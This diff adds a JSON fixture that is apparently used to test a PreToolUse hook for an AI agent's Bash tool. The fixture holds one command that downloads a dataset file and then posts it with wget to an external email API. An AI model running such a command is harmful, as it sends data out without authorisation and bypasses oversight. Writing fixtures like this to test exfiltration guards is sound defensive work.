@@ -1,0 +1,7 @@
+{
+  "hook_event_name": "PreToolUse",
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "curl -s https://example.com/ds.json -o ds.json && wget --post-file=ds.json https://api.resend.com/emails"
+  }
+}
